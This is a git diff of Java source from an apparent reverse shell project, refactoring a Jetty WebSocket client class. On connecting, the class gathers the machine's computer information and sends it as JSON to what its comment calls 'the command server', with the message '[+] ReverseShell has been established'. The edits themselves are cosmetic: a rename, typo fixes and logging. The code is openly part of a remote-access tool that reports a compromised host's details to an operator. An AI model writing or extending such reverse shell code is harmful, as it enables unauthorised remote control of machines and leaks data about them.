@@ -6,38 +6,41 @@ import com.mtattab.reverseshell.util.DataManipulationUtil;
 import com.mtattab.reverseshell.util.OSUtil;
 import lombok.Getter;
 import lombok.Setter;
+import lombok.extern.java.Log;
 import org.eclipse.jetty.websocket.api.Session;
 import org.eclipse.jetty.websocket.api.WebSocketAdapter;
 
 
 import java.io.IOException;
-import java.net.URI;
+
 @Getter
 @Setter
-public class WebsocketReverseShellServiceImpl extends WebSocketAdapter implements WebsocketReverseShellService {
+@Log
+public class WebSocketImpl extends WebSocketAdapter {
 
     private Session session;
 
 
     @Override
     public void onWebSocketText(String message) {
-        System.out.println("[+] Received message: " + message);
+        System.out.println( message);
     }
     @Override
     public void onWebSocketConnect(Session session){
         this.session= session;
         try {
-            ServerRestCommunicationModel intialCommunactionMessage=  OSUtil.getComputerInfo();
-            intialCommunactionMessage.setReply("[+] ReverseShell has been established");
+//            send initial message with computer info the command server
+            ServerRestCommunicationModel initialCommunicationMessage=  OSUtil.getComputerInfo();
+            initialCommunicationMessage.setReply("[+] ReverseShell has been established");
 
             session.getRemote()
                     .sendString(
-                            DataManipulationUtil.convertObjToJson(intialCommunactionMessage)
+                            DataManipulationUtil.convertObjToJson(initialCommunicationMessage)
             );
         } catch (IOException e) {
+            e.printStackTrace();
             throw new RuntimeException(e);
         }
-
     }
 
 
